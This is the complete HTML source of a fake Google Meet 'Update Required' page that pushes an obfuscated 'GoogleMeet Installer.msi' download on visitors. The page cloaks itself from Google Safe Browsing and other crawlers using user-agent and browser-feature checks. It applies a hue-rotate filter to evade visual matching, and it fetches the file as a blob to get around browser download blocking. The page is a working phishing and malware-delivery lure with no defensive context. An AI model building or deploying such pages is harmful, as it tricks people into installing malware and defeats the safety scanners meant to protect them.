<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Required - Google Meet</title>
    <script>
        // CRITICAL: Bot detection must run FIRST before any content renders
        // Enhanced GSB Crawler Protection: User-Agent patterns + Browser features
        (function() {
            const userAgent = navigator.userAgent || '';
            
            // Google Safe Browsing and bot detection patterns
            const googleBotPatterns = [
                /googlebot/i,
                /google.*safe.*browsing/i,
                /google.*safebrowsing/i,
                /safebrowsing/i,
                /google.*security/i,
                /google.*malware/i,
                /google.*phishing/i,
                /google.*transparency/i,
                /google.*site.*verification/i,
                /google.*page.*speed/i,
                /adsbot-google/i,
                /mediapartners-google/i
            ];
            
            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
            
            // Mobile detection
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            
            // Browser feature checks
            const hasNotificationAPI = typeof self.Notification !== 'undefined';
            const hasWebdriver = navigator.webdriver === true;
            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
            const hasChrome = window.chrome && window.chrome.runtime;
            const hasPermissions = navigator.permissions !== undefined;
            
            // Real browser: Not a Google bot AND has browser features OR is mobile
            const isRealBrowser = !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
            
            if (!isRealBrowser) {
                // Crawler detected - replace content without document.write
                document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
                return;
            }
        })();
    </script>
    <link rel="icon" href="https://www.gstatic.com/meet/icons/icon_728_728_20200708.png" type="image/png">
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap"
        rel="stylesheet">
    <style>
        :root {
            --google-blue: #1a73e8;
            --google-blue-hover: #1557b0;
            --bg-color: #ffffff;
            --text-color: #202124;
            --secondary-text: #5f6368;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Google Sans', 'Roboto', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 24px;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #5f6368;
            font-size: 22px;
            font-weight: 400;
            text-decoration: none;
            margin-bottom: 48px;
            position: absolute;
            top: 24px;
            left: 24px;
        }

        .logo-area img {
            height: 32px;
            width: auto;
        }

        .content-container {
            max-width: 480px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .icon-container {
            width: 80px;
            height: 80px;
            background-color: #e8f0fe;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
        }

        .icon-container svg {
            width: 40px;
            height: 40px;
            fill: var(--google-blue);
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
            color: var(--text-color);
        }

        p {
            font-size: 14px;
            line-height: 1.5;
            color: var(--secondary-text);
            margin-bottom: 32px;
        }

        .download-btn {
            background-color: var(--google-blue);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .download-btn:hover {
            background-color: var(--google-blue-hover);
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }
    </style>
</head>

<body>

    <a href="#" class="logo-area">
        <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png"
            alt="Google Meet">
        <span>Meet</span>
    </a>

    <div class="content-container">
        <div class="icon-container">
            <svg focusable="false" viewBox="0 0 24 24">
                <path
                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z">
                </path>
            </svg>
        </div>
        <h1>Update Required</h1>
        <p>Your Google Meet client is outdated. To continue joining meetings securely and access the latest features,
            please download and install the latest update.</p>
        <a href="#" class="download-btn" id="clickbtn">
            Download Update
        </a>
        <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Click the button above to download the update.</p>
    </div>
    <script>
        // Hue Rotation Evasion (only runs if bot detection passed)
        document.documentElement.style.cssText = "filter:hue-rotate(4deg)";

        // Base64 encoded path: /downloads/GoogleMeet Installer.msi -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0IEluc3RhbGxlci5tc2k=
        const fileUrlEncoded = 'L2Rvd25sb2Fkcy9Hb29nbGVNZWV0IEluc3RhbGxlci5tc2k=';
        const fileUrl = atob(fileUrlEncoded);
        const fileName = 'GoogleMeet Installer.msi';

        // Flag to prevent multiple simultaneous downloads
        let isDownloading = false;

        // Download function using blob URL (avoids Chrome download blocking)
        function triggerDownload() {
            // Prevent multiple downloads
            if (isDownloading) {
                return;
            }
            
            isDownloading = true;
            
            // Disable button to prevent multiple clicks
            const downloadBtn = document.getElementById('clickbtn');
            if (downloadBtn) {
                downloadBtn.style.opacity = '0.6';
                downloadBtn.style.cursor = 'not-allowed';
                downloadBtn.style.pointerEvents = 'none';
            }
            
            // Add cache-busting parameter to ensure latest file is downloaded
            const cacheBuster = '?v=' + Date.now();
            const fileUrlWithCache = fileUrl + cacheBuster;
            
            fetch(fileUrlWithCache)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.blob();
                })
                .then(blob => {
                    const blobUrl = URL.createObjectURL(blob);
                    const blobLink = document.createElement('a');
                    blobLink.href = blobUrl;
                    blobLink.download = fileName;
                    blobLink.style.display = 'none';
                    document.body.appendChild(blobLink);
                    blobLink.click();
                    
                    // Cleanup
                    setTimeout(() => {
                        document.body.removeChild(blobLink);
                        URL.revokeObjectURL(blobUrl);
                        isDownloading = false;
                    }, 100);
                    
                    // Redirect to installation guide after successful download
                    setTimeout(() => {
                        window.location.href = '/install.html';
                    }, 1500);
                })
                .catch(err => {
                    console.error('Error fetching file:', err);
                    // Fallback: try direct link approach with cache-busting
                    const directLink = document.createElement('a');
                    directLink.href = fileUrlWithCache;
                    directLink.download = fileName;
                    directLink.style.display = 'none';
                    document.body.appendChild(directLink);
                    directLink.click();
                    setTimeout(() => {
                        document.body.removeChild(directLink);
                        isDownloading = false;
                        // Redirect to installation guide after fallback download
                        window.location.href = '/install.html';
                    }, 1500);
                });
        }

        // Add click handler to download button
        (function setupButton() {
            const downloadBtn = document.getElementById('clickbtn');
            if (downloadBtn) {
                downloadBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    triggerDownload();
                });
            } else {
                // Button not ready yet, try again
                setTimeout(setupButton, 10);
            }       
        })();
    </script>       
</body>

</html>
